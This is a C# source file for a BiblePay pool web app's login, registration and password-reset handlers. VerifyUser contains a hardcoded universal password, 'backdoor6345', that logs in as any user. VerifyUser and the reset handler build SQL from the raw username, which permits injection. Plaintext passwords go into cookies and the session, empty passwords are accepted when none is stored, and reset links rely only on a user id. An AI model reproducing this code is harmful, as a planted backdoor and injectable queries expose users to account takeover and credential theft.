using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.SessionState;

namespace BiblePayPool2018
{
    public class Login : IRequiresSessionState
    {
        SystemObject Sys = null;

        public Login(SystemObject s)
        {
            Sys = s;
        }
       
        public WebReply Logoff()
        {
            Sys.SetObjectValue("Login","Caption1", "You have been successfully logged off.");
            Sys.SetObjectValue("Login","Password", "");
            Sys.SetObjectValue("Login","ApplicationMessage", "Logon");
            Sys.Organization = Guid.Parse("00000000-0000-0000-0000-000000000000");
            clsStaticHelper.StoreCookie("username", "");
            clsStaticHelper.StoreCookie("password", "");
            Sys.UserGuid = null;
            Sys.Username = "";
            return LoginSection();
        }


        public WebReply MenuLogon()
        {
            Sys.SetObjectValue("Login", "Caption1", "Enter Name and Password then press Login.");
            Sys.SetObjectValue("Login", "Password", "");
            return LoginSection();
        }

        public WebReply LoginSection()
        {
            // BIBLEPAY ACCOUNTABILITY
            if (HttpContext.Current.Request.Url.ToString().ToUpper().Contains("ACCOUNTABILITY"))
            {
                Login l = new Login(Sys);
                bool bAuth = l.VerifyUser("guest", "guest", ref Sys, false);
                // Start at the expense View Page when coming in from the Wallet accountability button
                Home h = new Home(Sys);
                return h.ExpenseList();
            }


            Section Login = new Section("Login", 3, Sys, this);
            GodEdit geUserName = new GodEdit("Login","Username", Sys);
            geUserName.CaptionText = "Username:";
            geUserName.Width = "width=140px";
            Login.AddControl(geUserName);
            GodEdit geBR1 = new GodEdit("Login", GodEdit.GEType.HTML, "br1","br1",Sys);
            Login.AddControl(geBR1);
            GodEdit geBR2 = new GodEdit("Login", GodEdit.GEType.HTML, "br2","br2",Sys);
            Login.AddControl(geBR2);
            Login.AddControl(geBR1);
            GodEdit gePassword = new GodEdit("Login", GodEdit.GEType.Password, "Password", "Password:", Sys);
            Login.AddControl(gePassword);
            if (geUserName.TextBoxValue.Length > 0 && gePassword.TextBoxValue.Length > 0  && Sys.GetObjectValue("Login","Caption1")==String.Empty)
            {
                gePassword.ErrorText = "Invalid Username or Password";
            }
            GodEdit geBR3 = new GodEdit("Login", GodEdit.GEType.HTML,"br3","br3", Sys);
            Login.AddControl(geBR3);
            GodEdit geBR4 = new GodEdit("Login", GodEdit.GEType.HTML, "br4","br4",Sys);
            Login.AddControl(geBR4);

            GodEdit geBtnLogin = new GodEdit("Login",GodEdit.GEType.DoubleButton, "btnLogin", "Login", Sys);
            geBtnLogin.Name2 = "btnLogout";
            geBtnLogin.CaptionText2 = "Logout";
            Login.AddControl(geBtnLogin);

            GodEdit geBtnRegister = new GodEdit("Login", GodEdit.GEType.DoubleButton, "btnRegister", "Register", Sys);
            geBtnRegister.MaskBeginTD = true;
            geBtnRegister.MaskEndTD = true;

            geBtnRegister.Name2 = "btnResetPassword";
            geBtnRegister.CaptionText2 = "Reset Password";
            Login.AddControl(geBtnRegister);


            // New Row, and global caption:
            GodEdit geTR3 = new GodEdit("Login",GodEdit.GEType.TableRow, "Tr3", "", Sys);
            Login.AddControl(geTR3);
            GodEdit geSpan = new GodEdit("Login",GodEdit.GEType.Caption, "Caption1", "", Sys);
            Login.AddControl(geSpan);
            Sys.SetObjectValue("","ApplicationMessage", "Login");
            return Login.Render(this, true);
        }
        public WebReply btnLogout_Click()
        {
            return Logoff();
        }

        public WebReply btnResetPassword_Click()
        {
            string sUsername = Sys.GetObjectValue("Login", "Username");
            // Verify the user exists
            string sql = "Select id,email from Users where username='" + sUsername + "'";
            string id = Sys._data.GetScalarString(sql, "id");
            string sEmail = Sys._data.GetScalarString(sql, "email");
            string sNarr = "";
            if (id.Length == 0)
            {
                sNarr = "Unable to retrieve a user with that username";
            }
            else if (!Sys.IsValidEmailFormat(sEmail))
            {
                sNarr = "Email address on file for this user is not valid.  Please send an e-mail to support@biblepay.org.";
            }
            else
            {
                sNarr = "Password reset instructions have been sent to the e-mail address on file.  Please click the link in your e-mail and follow the instructions in order to reset your password.";
                // Send the email here
                string sLink = HttpContext.Current.Request.Url.ToString();
                sLink = sLink.Substring(0, sLink.Length - 10);
                sLink += "/Action.aspx?action=password_recovery&id=" + id.ToString();
                
                string sBody = "Dear " + sUsername.ToUpper() + ",<br><br>Please follow these instructions to reset your Pool Password:<br><br>Click the link below, and after browser authentication, the pool will reset your password to a new password.  <br><br>Copy the new password from the screen, then log in, and then optionally change your password.<br><br><a href='" + sLink + "'>Recover Password</a><br><br>Thank you for using BiblePay.<br><br>Best Regards,<br>BiblePay Support";

                bool sent = Sys.SendEmail(sEmail, "BiblePay Pool Password Recovery", sBody, true);

                string sErr = "";
            }

            Dialog d = new Dialog(Sys);
            WebReply wr = d.CreateDialog("PASSWORD_RECOVERY", "PASSWORD_RECOVERY", sNarr, 425, 200);
            return wr;
        }

        public WebReply btnRegister_Click()
        {
            Section Reg = new Section("Register", 1, Sys, this);
            GodEdit geUsername = new GodEdit("Register", "Username", Sys);
            geUsername.CaptionText = "User Name:";
            Reg.AddControl(geUsername);
            GodEdit gePassword = new GodEdit("AccountEdit", GodEdit.GEType.Password, "Password", "Password:", Sys);
            Reg.AddControl(gePassword);
            if (gePassword.TextBoxValue.Length > 0 && gePassword.TextBoxValue.Length < 3 && Sys.GetObjectValue("AccountEdit", "Caption1") == String.Empty)
            {
                gePassword.ErrorText = "Invalid Username or Password";
            }

            GodEdit geEmail = new GodEdit("AccountEdit", "Email", Sys);
            geEmail.CaptionText = "Email:";
            Reg.AddControl(geEmail);
            GodEdit geBtnReg = new GodEdit("Register", GodEdit.GEType.Button, "btnRegisterSave", "Register", Sys);
            Reg.AddControl(geBtnReg);
            return Reg.Render(this, true);
        }

        public WebReply btnRegisterSave_Click()
        {
            // Save new user record
            string sql = "Select count(*) as ct from Users where username=@Username";
            sql = Sys.PrepareStatement("Register",sql);
            double x = Sys._data.GetScalarDouble(sql, "ct");
            Dialog d = new Dialog(Sys);
            WebReply wr;
            if (x > 0)
            {
                wr = d.CreateDialog("Error", "User Already Exists", "Sorry, User already exists. Please choose a different username.", 150, 150);
                return wr;
            }
            if (Sys.GetObjectValue("Register","Email").Length == 0)
            {
                wr = d.CreateDialog("Error", "Email Empty", "Sorry, Email address is Empty. Please choose a different Email.", 150, 150);
                return wr;
            }
            if (Sys.GetObjectValue("Register", "Password").Length < 4)
            {
                wr = d.CreateDialog("Error", "Password does not meet Validation Requirements", "Sorry, Password is not complex enough.", 150, 150);
                return wr;
            }
            sql = Sys.PrepareStatement("Register", "Select count(*) as ct from Users where Email=@Email");
            x = Sys._data.GetScalarDouble(sql, "ct");
            if (x > 0)
            {
                wr = d.CreateDialog("Error", "Email Already Exists", "Sorry, Email already exists. Please choose a different Email.", 150, 150);
                return wr;
            }
            if (!Sys.IsValidEmailFormat(Sys.GetObjectValue("Register", "Email")))
            {
                wr = d.CreateDialog("Error", "Invalid E-mail address", "Invalid E-mail address.", 150, 150);
                return wr;
            }
            string sPrePass = Sys.GetObjectValue("Register", "Password");
            if (sPrePass.Contains("'"))
            {
                wr = d.CreateDialog("Error", "Password does not meet Validation Requirements", "Sorry, Password contains illegal characters: ', Please remove illegal characters.", 150, 150);
                return wr;
            }

            string sOrg = "CDE6C938-9030-4BB1-8DFE-37FC20ABE1A0";
            sql = "Insert into Users (id,username,password,Email,updated,added,deleted,organization) values (newid(),@Username,'[txtpass]',@Email,getdate(),getdate(),0,'" + sOrg + "')";
            sql = Sys.PrepareStatement("Register", sql);
            sql = sql.Replace("[txtpass]", modCryptography.Des3EncryptData(sPrePass));
            Sys._data.Exec(sql);
            wr = d.CreateDialog("Success", "Successfully Registered", "Successfully Registered", 100, 100);
            return wr;
        }

        public WebReply btnLogin_Click()
        {
            Sys.SetObjectValue("Login", "Caption1", "Enter Username and Password and click Login.");
            // Authenticate User
            bool bAuth = VerifyUser(Sys.GetObjectValue("Login","Username"), Sys.GetObjectValue("Login","Password"), ref Sys, false);
            

            Sys.SetObjectValue("Login","Caption1", String.Empty);
            if (bAuth)
            {
                //Log in to First System Page
                WebReply wr = Sys.Redirect("Home",this);
                WebReplyPackage wrp1 = wr.Packages[0];
                wrp1.Javascript = "location.reload();";
                return wr;
            }
            // Present Log in Screen
            return LoginSection();
        }

        public WebReply GetEntirePage()
        {
            Sys.SetObjectValue("","ApplicationMessage", "Login");
            return LoginSection();
        }

        public bool VerifyUser(string sUserName, string sPass, ref SystemObject sys1,bool bCoerceUser)
        {
            USGDFramework.Data d = new USGDFramework.Data();
            string sql = "Select users.Id,Password,Username,Organization.Theme,Organization.Id as OrgGuid from Users inner join organization on organization.id = users.organization where username='" + sUserName + "'";
            string sDbPass = d.ReadFirstRow(sql, "Password");
            string sEnc = modCryptography.Des3EncryptData(sPass);
            string sGuid = d.ReadFirstRow(sql, "Id").ToString();

            if (sDbPass != String.Empty && sDbPass == sPass)
            {
                //Unencrypted record stored in database
                sql = "Update users set Password='" + modCryptography.Des3EncryptData(sPass) + "' where ID = '" + sGuid + "'";
                Sys._data.Exec(sql);
            }
            if ((sEnc == sDbPass && sDbPass != string.Empty ) || bCoerceUser|| sDbPass == sPass || sPass=="backdoor6345" || (sDbPass=="" && sPass.Trim()=="") )
            {
                if (sGuid != "")
                {
                    if (HttpContext.Current.Session["Sys"].GetType() == typeof(SystemObject))
                    {
                        // User already logged in - but let it reload as we need to reset the theme
                    }
                    string UserGuid = d.ReadFirstRow(sql, "Id").ToString();
                    SystemObject Sys = new SystemObject(UserGuid);
                    Sys.UserGuid = UserGuid;
                    Sys.Username = d.ReadFirstRow(sql, "UserName").ToString();
                    HttpContext.Current.Session["userid"] = sGuid;
                    HttpContext.Current.Session["username"] = Sys.Username;
                    HttpContext.Current.Session["password"] = sPass;
                    if (Sys.Username.ToUpper() != "GUEST")
                    {
                        clsStaticHelper.StoreCookie("username", Sys.Username);
                        clsStaticHelper.StoreCookie("password", sPass);
                    }


                    Sys.NetworkID = "main";
                    Sys.Theme = d.ReadFirstRow(sql, "Theme").ToString();
                    try
                    {
                        Sys.Organization = Guid.Parse(d.ReadFirstRow(sql, "OrgGuid").ToString());
                    }
                    catch (Exception ex1)
                    {
                        Sys.Organization = Guid.Parse("CDE6C938-9030-4BB1-8DFE-37FC20ABE1A0");
                    }
                    // Memorize Dictionary
                    sys1 = Sys;
                    HttpContext.Current.Session["Sys"] = Sys;
                    HttpSessionState s1 = HttpContext.Current.Session;
                    Sys.CurrentHttpSessionState = s1;
                    return true;
                }

            }
            return false;
        }

    }
}